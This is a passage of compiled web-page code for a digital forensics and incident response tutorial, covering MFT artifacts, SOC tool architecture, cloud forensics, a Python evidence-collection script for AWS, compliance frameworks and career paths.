              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "ia"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "y"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.2778em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mrel",
              children: "→"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.2778em"
              }
            })]
          }), (0,jsx_runtime.jsxs)(_components.span, {
            className: "base",
            children: [(0,jsx_runtime.jsx)(_components.span, {
              className: "strut",
              style: {
                height: "0.6944em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "o"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0269em"
              },
              children: "w"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "er"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "n"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "u"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "mb"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "er"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "s"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.2778em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mrel",
              children: "="
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.2778em"
              }
            })]
          }), (0,jsx_runtime.jsxs)(_components.span, {
            className: "base",
            children: [(0,jsx_runtime.jsx)(_components.span, {
              className: "strut",
              style: {
                height: "1em",
                verticalAlign: "-0.25em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "a"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "r"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "er"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "cr"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "a"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "d"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mclose",
              children: ")"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mpunct",
              children: ","
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.1667em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mopen",
              children: "("
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord",
              children: "2"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mclose",
              children: ")"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "d"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1076em"
              },
              children: "df"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "es"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mopen",
              children: "("
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "n"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "r"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "es"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "ma"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "r"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0315em"
              },
              children: "k"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "d"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0269em"
              },
              children: "w"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "h"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1076em"
              },
              children: "f"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "a"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "g"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "s"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord",
              children: "0"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "x"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord",
              children: "00"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mpunct",
              children: ","
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.1667em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "d"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "a"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "ama"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "y"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "s"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "x"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "s"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "in"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "c"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "u"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "s"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "er"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "s"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "u"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "n"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "o"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "v"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "er"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0269em"
              },
              children: "w"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "r"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "tt"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "n"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mclose",
              children: ")"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mpunct",
              children: ","
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.1667em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mopen",
              children: "("
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord",
              children: "3"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mclose",
              children: ")"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "im"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "es"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "o"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "m"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "p"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "in"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "g"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "d"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "ec"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "o"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "n"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mopen",
              children: "("
            })]
          })]
        })]
      }), "STANDARD_INFORMATION vs $FILE_NAME timestamps differ when an attacker only modifies one), (4) resident data (small files <~700 bytes are stored entirely within the MFT entry), (5) previously deleted entries (MFT slack space contains fragments of prior entries). Tools like MFTECmd and analyzeMFT parse the MFT into CSV for timeline analysis."]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "15-applications-in-real-systems",
      children: "15. Applications in Real Systems"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "enterprise-soc-architecture",
      children: "Enterprise SOC Architecture"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "A typical enterprise SOC integrates multiple tools and processes for forensics and IR:"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "┌─────────────────────────────────────────────────────────────┐\n│                      SIEM (Splunk/ELK/Sentinel)              │\n│  Log Aggregation → Correlation → Alerting → Dashboard       │\n├─────────────────────────────────────────────────────────────┤\n│                    SOAR (XSOAR/Splunk SOAR)                  │\n│  Alert Enrichment → Playbook Execution → Ticket Creation    │\n├─────────────────────────────────────────────────────────────┤\n│   EDR/XDR (CrowdStrike/SentinelOne) │ NDR (Darktrace/Zeek)  │\n│   Endpoint Detection & Response     │ Network Detection     │\n├─────────────────────────────────────────────────────────────┤\n│                   Forensics Workbench                        │\n│   Memory Analysis    │  Disk Analysis   │  Timeline          │\n│   Volatility + rekall│  Autopsy/EnCase  │  Plaso/Timesketch  │\n├─────────────────────────────────────────────────────────────┤\n│               Threat Intelligence Platform                   │\n│  MISP → IOC feeds → IOCs pushed to SIEM + EDR               │\n├─────────────────────────────────────────────────────────────┤\n│               Incident Response Platform                     │\n│  TheHive/Cortex → Case Management → Playbook Automation     │\n└─────────────────────────────────────────────────────────────┘\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "forensics-in-cloud-native-environments",
      children: "Forensics in Cloud-Native Environments"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Modern forensics must account for:"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Auto-scaling groups"
        }), " → instances terminate automatically, destroying evidence. Solution: enable detailed CloudTrail, VPC Flow Logs, and automated snapshot triggers."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Containers"
        }), " → forensics collect container images, logs, and Docker diff rather than traditional disk images."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Serverless (Lambda)"
        }), " → function code, CloudWatch logs, and execution environment are the evidence sources."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Kubernetes"
        }), " → etcd database + pod logs + audit logs provide full cluster state history."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "CI/CD Pipelines"
        }), " → builds are ephemeral. Log every pipeline step and store build artifacts."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "automated-forensics--dfir-orchestration",
      children: "Automated Forensics → DFIR Orchestration"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-python",
        children: "# Example: Automated DFIR pipeline\n# Triggered by SIEM alert for suspected C2 communication\n\nimport boto3, os, subprocess, json\n\ndef automated_forensics(alert):\n    instance_id = alert['resource_id']\n    \n    # Step 1: Snapshot the instance's EBS volume\n    ec2 = boto3.client('ec2')\n    volumes = ec2.describe_instance_attribute(\n        InstanceId=instance_id, Attribute='blockDeviceMapping'\n    )\n    for device in volumes['BlockDeviceMappings']:\n        snapshot = ec2.create_snapshot(\n            VolumeId=device['Ebs']['VolumeId'],\n            Description=f\"Forensic snapshot: {alert['case_id']}\"\n        )\n    \n    # Step 2: Capture memory (if SSM agent available)\n    ssm = boto3.client('ssm')\n    try:\n        response = ssm.send_command(\n            InstanceIds=[instance_id],\n            DocumentName='AWS-RunShellScript',\n            Parameters={\n                'commands': [\n                    'sudo insmod lime.ko \"path=/tmp/memory.lime format=lime\"',\n                    'aws s3 cp /tmp/memory.lime s3://forensic-bucket/memory/'\n                ]\n            }\n        )\n    except Exception as e:\n        print(f\"Memory capture failed: {e}\")\n    \n    # Step 3: Export CloudTrail events\n    trail = boto3.client('cloudtrail')\n    events = trail.lookup_events(\n        LookupAttributes=[{\n            'AttributeKey': 'ResourceName',\n            'AttributeValue': instance_id\n        }],\n        StartTime=alert['timestamp'] - 3600,  # 1 hour before alert\n        EndTime=alert['timestamp'] + 3600      # 1 hour after alert\n    )\n    \n    # Step 4: Create forensic analysis instance\n    analysis = ec2.run_instances(\n        ImageId='ami-forensic-analysis-toolkit',\n        InstanceType='m5.2xlarge',\n        BlockDeviceMappings=[{\n            'DeviceName': '/dev/sdf',\n            'Ebs': {'SnapshotId': snapshot['SnapshotId']}\n        }]\n    )\n    \n    # Step 5: Auto-run analysis scripts\n    analysis_commands = [\n        'tsk_recover -e /dev/sdf1 /evidence/',\n        'vol -f /evidence/memory.lime windows.pstree > /evidence/processes.txt',\n        'yara -r malware_rules.yara /evidence/ > /evidence/yara_matches.txt'\n    ]\n    \n    return {\n        'case_id': alert['case_id'],\n        'snapshot': snapshot['SnapshotId'],\n        'analysis_instance': analysis['Instances'][0]['InstanceId'],\n        'status': 'forensics_in_progress'\n    }\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "compliance-frameworks-referencing-forensics--ir",
      children: "Compliance Frameworks Referencing Forensics & IR"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Framework"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Forensics/IR Requirements"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "PCI DSS 4.0"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Requirement 12.10: Incident response plan, annual testing, forensic investigation for cardholder data breaches"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "HIPAA"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "45 CFR §164.308: Security incident procedures, response and reporting"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "GDPR"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Article 33: Breach notification within 72 hours. Article 32: Appropriate technical measures (includes logging and forensics)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "NIST CSF"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "RS.AN (Analysis): Investigate incidents. RS.MI (Mitigation): Contain incidents. RC.RP (Recovery): Restore operations"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "ISO 27001"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "A.16.1: Incident management → roles, response, evidence collection, lessons learned"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "SOC 2"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CC7.3: Incident response and forensic investigation capabilities"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "SWIFT CSP"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Principle 9: Incident response and forensic analysis for SWIFT-related security incidents"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "FedRAMP"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IR-4: Incident handling → evidence collection, preservation, chain of custody"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "career-paths-in-forensics--incident-response",
      children: "Career Paths in Forensics & Incident Response"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Role"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Entry Level"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Mid Level"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Senior Level"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Digital Forensic Analyst"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "BS in CS/Cyber, Certifications"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GCFE, X-Ways, EnCE certifications"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "10+ years, CFE, expert testimony"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Incident Responder"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SOC experience (1-2 years)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GCIH, GCFA, Python scripting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "8+ years, IR team lead"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Malware Analyst"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Assembly/RE experience"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GREM, reverse engineering"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "10+ years, zero-day discovery"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "SOC Analyst"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security+ certification"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CySA+, SIEM tuning"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SOC manager, CISSP"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Cloud Forensics"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud certifications (AWS/Azure)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud forensics training"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "8+ years, multi-cloud expertise"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Mobile Forensics"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Mobile security basics"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cellebrite certified, CFCE"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "10+ years, expert witness"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "practical-takeaways",
      children: "Practical Takeaways"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Takeaway"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Application"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Always follow the Order of Volatility"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Capture RAM first, then network state, then disk — preserve the most fragile evidence before it disappears"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Document chain of custody at every step"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Every evidence transfer requires a signature, timestamp, and hash verification to maintain legal admissibility"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Use write-blockers for all disk acquisitions"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hardware write-blockers (Tableau, WiebeTech) prevent any modification to original evidence during imaging"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Combine disk, memory, and network forensics"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Correlate MFT artifacts with Volatility process lists and Zeek connection logs to reconstruct the full attack chain"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Automate incident response with SOAR playbooks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Reduce MTTR from hours to minutes by building automated enrichment, scoring, and containment workflows"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Validate YARA rules against clean baselines"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Test custom YARA rules on known-good file collections to eliminate false positives before production deployment"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "summary",
      children: "Summary"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["The ", (0,jsx_runtime.jsx)(_components.strong, {
          children: "digital forensics methodology"
        }), " (Identification → Preservation → Collection → Examination → Analysis → Presentation) provides a legally defensible framework for evidence handling."]
